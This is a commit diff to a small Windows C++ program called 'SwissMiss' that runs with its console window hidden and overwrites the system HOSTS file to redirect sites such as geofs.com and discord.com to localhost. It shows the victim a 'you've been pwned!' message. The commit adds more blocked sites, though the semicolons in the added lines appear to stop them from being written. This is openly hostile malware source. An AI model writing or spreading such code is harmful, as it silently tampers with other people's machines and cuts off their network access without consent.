d6daf50371ebef43a5fca0d342da2ef1de1c2303
freyjapaws <freyjapaws@gmail.com>
2024-08-29 13:07:57 -0600

    Update core.cpp
    changed some output, added more blocks

--- SwissMiss/core.cpp
+++ SwissMiss/core.cpp
@@ -15,7 +15,7 @@
 
 using namespace std;
 
-const char msg1[]="You're working too hard. You need to pr0crastinate!";
+const char msg1[]="Infinity's Omega, you've been pwned!";
 
 int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE PrevInstance,
                             LPSTR lpszArgument, int nFunsterStil)
@@ -27,7 +27,7 @@ hide = FindWindowA("ConsoleWindowClass", NULL);
 ShowWindow(hide, 0);
           
 {
-	CreateMutexA(NULL, TRUE, "procrastinat0r"); 
+	CreateMutexA(NULL, TRUE, "SwissMiss"); 
 if (GetLastError() == ERROR_ALREADY_EXISTS)
 ExitProcess(0); 
 return 0;
@@ -39,6 +39,8 @@ GetSystemDirectory(host, sizeof(host));
 strcat(host, "\\Drivers\\ETC\\HOSTS");
 	const char* buffer =
                        "127.0.0.1     www.geofs.com/geofs.php";
+                       "127.0.0.1     www.discord.com";
+                       "127.0.0.1     www.geofs.fandom.com";
                        
 DWORD byte;
 HANDLE hFile = CreateFile(host, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
